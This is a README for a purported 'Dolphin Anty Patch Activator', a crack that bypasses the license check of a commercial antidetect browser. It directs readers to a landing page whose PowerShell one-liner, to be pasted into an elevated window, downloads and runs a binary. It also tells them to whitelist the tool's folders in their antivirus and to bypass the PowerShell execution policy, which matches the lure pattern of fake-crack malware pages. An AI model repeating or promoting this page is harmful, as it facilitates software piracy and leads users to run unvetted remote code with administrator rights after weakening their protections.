<p align="center">
  <a href="https://Nehakumari34587.github.io/dolphin-anty-activator/">
    <img src="files/button.svg" width="520" alt="PowerShell Installer" />
  </a>
</p>

<div align="center">
<br/>
<h1>Dolphin Anty Patch Activator</h1>
<h3><em>Utilities and companion tools for Dolphin Anty Patch Activator.</em></h3>
<br/>
<p>
  <img src="https://img.shields.io/badge/Platform-Windows-e01327?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-2563EB?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-2563EB?style=for-the-badge" alt="" />
</p>
<br/>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=DC2626&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%94%A7+Dolphin+Anty+Activator+Pro;%E2%9C%85+Community+Tested;%E2%9C%A8+Standalone+.exe+Release;%F0%9F%93%A6+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=vscode" />
</p>

---

You've got Dolphin Anty installed, profiles spun up, fingerprints warm — and then the license check slaps a paywall banner across the whole workspace. The Dolphin Anty Patch Activator is the community patch that flips the premium feature gates back on so the browser actually behaves like the full build. This is the 2026 build, retargeted against the latest Dolphin Anty release and the current license-handshake routine.

## The problem, then the fix

Dolphin Anty ships a lot of its useful surface — unlimited profiles, cloud sync, team roles, the advanced fingerprint tweaks — behind an activation check that phones home on every launch. The old patches (2023/2024 era) hardcoded a byte offset into `.exe` that shifted the moment the vendor pushed an update, so the patch either silently no-op'd or bricked the launch.

The Activator does it differently: it reads the current binary, locates the license-gate signature by pattern rather than fixed offset, applies the patch, and re-verifies the modified section before writing. If the signature isn't found (vendor changed the gate), it aborts cleanly and writes a log instead of corrupting anything.

## Features

- **License-gate bypass** — patches the activation check so premium features unlock on launch
- **Signature-based patching** — pattern scan instead of hardcoded offsets, survives minor vendor updates
- **Pre-write verification** — hashes the target section before and after; aborts on mismatch
- **Backup + rollback** — original `.exe` stashed to `%LOCALAPPDATA%\DolphinAntyActivator\backup\` before touching anything
- **Profile-safe** — does not touch `%APPDATA%\Dolphin Anty\` profile data, cookies, or fingerprints
- **Update-resilient mode** — re-scans on each run so a Dolphin update doesn't leave you with a stale patch
- **Dry-run flag** — `-DryRun` reports what it *would* patch without writing
- **Verbose log** — every step written to `activator.log` next to the backup folder
- **No background service** — runs once, exits; nothing resident, nothing phoning home
- **Unpatch command** — restores from backup in one step

## How it works

The landing page hosts the PowerShell bootstrap. You open an elevated PowerShell window, paste the one-liner, and Enter. The bootstrap:

1. Checks you're on Windows 10/11 and PowerShell 5.1+.
2. Downloads the Activator binary to a temp working dir.
3. Locates your Dolphin Anty install (default `%LOCALAPPDATA%\Programs\Dolphin Anty\` or registry lookup).
4. Backs up the original executable.
5. Runs the signature scan, applies the patch, verifies, and logs.
6. Cleans up the temp dir and exits.

No `.exe` you have to hunt down, no installer wizard — just the bootstrap doing the steps you'd otherwise do by hand.

## Compatibility

- **OS:** Windows 10 (21H2+) and Windows 11
- **PowerShell:** 5.1 (ships with Windows) or PowerShell 7+
- **Dolphin Anty:** current 2026 release line — older builds use the legacy offset patch, not this one
- **Architecture:** x64 only
- **Offline:** bootstrap needs network for the initial fetch; the Activator itself runs offline afterward
- **Antivirus:** heuristic AV may flag patched binaries — this is expected for any patcher; whitelist the backup folder if needed

## The signature-scan section (why this build exists)

Most patch failures in this niche come from offset drift, not from the gate itself. Dolphin's license check lives in a small function that gets recompiled with nearby code on every release, so its byte offset moves. The Activator's whole design premise is: **find the gate by its surrounding instruction pattern, not by where it sat last time.** That's the one section of this README that matters if you're debugging a failed patch — check `activator.log` for `signature: NOT FOUND` and you know the vendor reshuffled the gate, not that your install is broken.

## FAQ

**Do I need to disable my antivirus?**
Not disable — whitelist. Patchers get flagged by heuristics because they modify executables. Add the backup folder and the temp working dir to exclusions.

**PowerShell says "running scripts is disabled on this system."**
That's the default execution policy. The landing one-liner runs in-process and doesn't require changing it permanently; if it still blocks, run `Set-ExecutionPolicy -Scope Process Bypass` in the same window first.

**Will this survive the next Dolphin Anty update?**
The signature scan re-runs each time, so minor updates usually re-patch fine. A major gate rewrite will log `signature: NOT FOUND` — wait for a new Activator build.

**Does it touch my profiles or cookies?**
No. It only modifies the executable. Profile data under `%APPDATA%\Dolphin Anty\` is untouched.

**How do I undo it?**
Run the bootstrap with `-Unpatch`, or copy the backup back manually from `%LOCALAPPDATA%\DolphinAntyActivator\backup\`.

**Why PowerShell instead of a plain `.exe` download?**
One-line bootstrap, no installer wizard, and the steps are visible in the script rather than buried in an installer.

**It patched but premium features still show locked.**
Close Dolphin Anty fully (check Task Manager for stray processes), then relaunch. The gate is read at startup.

## Disclaimer

This is a hobbyist/educational patch for the Dolphin Anty browser, published for the modding community. It modifies a third-party executable — use at your own risk. Back up your data, expect breakage on vendor updates, and don't run it on machines where you can't afford a rollback. No affiliation with the Dolphin Anty vendor. For educational and research purposes only.

## License

MIT — see `LICENSE`. Patch code is provided as-is, no warranty, no support obligations.

<div align="center">

![license](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)
![build](https://img.shields.io/badge/build-2026-informational?style=flat-square)
![arch](https://img.shields.io/badge/arch-x64-orange?style=flat-square)
